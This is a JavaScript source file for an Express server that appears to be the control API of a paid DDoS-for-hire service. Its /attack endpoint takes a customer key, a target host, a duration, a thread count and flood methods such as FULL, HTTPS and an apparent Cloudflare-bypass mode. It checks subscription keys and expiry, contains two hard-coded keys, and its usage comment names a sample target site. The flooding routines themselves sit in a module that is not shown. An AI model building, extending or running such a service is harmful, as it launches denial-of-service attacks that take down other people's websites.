const ModulsFile = require('./functions/load');
const { exec } = require("child_process");
const express = require("express");
var crypto = require("crypto");
const url = require('url');

let LoadModuls = new ModulsFile.LoadEvents();

const app = express();
app.use(express.json({ limit: "1kb" }));

/**
 * 
 * @DEV @Mrasdaas
 * @INFO : No change configuration of cloudfare, is for prevent ddos and sql injection.
 * @Usague : http://localhost/attack?key=32a738af6c4077e6d18e7f5b&host=https://dev.exitus.me&time=100&method=STRONG&thread=1&mode=http/http2
 * 
 **/

app.get("/info", async(req, res) => {
    let { key } = req.query;

        if (key.match(new RegExp(LoadModuls.Xss('key')))){
        LoadModuls.BanUser(key);
        LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
        res.destroy();
        return

    } else {

     let CheckKey = await LoadModuls.LoadUser(key, 'Used');
     let ExpireUser = await LoadModuls.LoadUser(key, 'expire');

     if(CheckKey == true & Date.now() < Number(ExpireUser)){
        await LoadModuls.infoUser(res, key, await LoadModuls.LoadUser(key, 'concurents'), await LoadModuls.LoadUser(key, 'maxtime'));
        res.destroy();
        return
}
}
});

app.get("/attack", async(req, res) => {
    let { key, thread, host, time, method, mode } = req.query;

  /*  if (host.match(new RegExp(LoadModuls.Xss('host')))){
        LoadModuls.BanUser(key);
        LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
        res.destroy();
        return
    } else

    if (time.match(new RegExp(LoadModuls.Xss('time')))){
        LoadModuls.BanUser(key);
        LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
        res.destroy();
        return
    } else

    if (method.match(new RegExp(LoadModuls.Xss('method')))){
        LoadModuls.BanUser(key);
        LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
        res.destroy();
        return
    } else

        if (key.match(new RegExp(LoadModuls.Xss('key')))){
            LoadModuls.BanUser(key);
            LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
            res.destroy();
            return

     } else {*/

     let CheckKey = await LoadModuls.LoadUser(key, 'Used');
     let ExpireUser = await LoadModuls.LoadUser(key, 'expire');

     //if(CheckKey == true & Date.now() < Number(ExpireUser)){
    if (key == '29468eb15e01bd3391b0c099b820a77cd4d96346ed02c028' || key == '89dc7980f8b906bb2568524f95b361a10a344d743bda901a'){

        if (Number(time)) {
          } else {
            res.send('Time string is invalid.');
            res.destroy();
            return
          }

          if (thread.match(/[0-9]/)){
          } else {
            LoadModuls.Write(res, 'thread option no is valid', 'error')
          }

          if (300 < time){ //await LoadModuls.LoadUser(key, 'maxtime') 
            LoadModuls.Write(res, 'You exeded you max bot Time.', 'error')
	          }

         if (host.match(/http(.*):\/\/[a-z,0-9](.*)[a-z,0-9]/)){ //only https
          } else {
            LoadModuls.Write(res, 'Host is no valid.', 'error')
            res.destroy();
            return
          }

if (method == 'STOP' || method == 'stop'){
    const ModulsFil2e = require('./functions/load');
    await ModulsFil2e.stopAttacks(res, host, key)
} else

if (method == 'FULL'){
    if (mode == 'http' || mode == 'http2' || mode == 'rawcf'){}else{LoadModuls.Write(res, 'Mode no valid.', 'error');res.destroy();return}

try {

if (thread.match(new RegExp(LoadModuls.Xss('thread')))){
    LoadModuls.BanUser(key);
    LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
    res.destroy();
    return
}

} catch (err){
    console.log(error)
}

const ModulsFil2e = require('./functions/load');
await ModulsFil2e.fullNetwork(res, key, host, time, method, thread, mode)
} else

if (method == 'HTTPS'){

if (mode == 'http' || mode == 'http2' || mode == 'rawcf'){}else{LoadModuls.Write(res, 'Mode no valid.', 'error');res.destroy();return}

try {

if (thread.match(new RegExp(LoadModuls.Xss('thread')))){
    LoadModuls.BanUser(key);
    LoadModuls.Write(res, 'Your key has been banned due to an xss or injection attempt. Contact support for more information.', 'error');
    res.destroy();
    return
}

} catch (err){
    console.log(error)
}

const ModulsFil2e = require('./functions/load');
let LoadAttackerClass = new ModulsFil2e.ConfigAttacker();
await ModulsFil2e.LoadAttack2(res, key, host, time, method, thread, mode)

    } else {
    LoadModuls.Write(res, `method no valid, only accept 'HTTPS'`, 'error')
}
}
//}
});

app.use( ( req, res ) => {
    res.type( 'text/plain' )
    res.status( 404 )
    res.send('404 Not found.')
})

app.listen(80, () => console.log(`Server Api on port 80.`) )
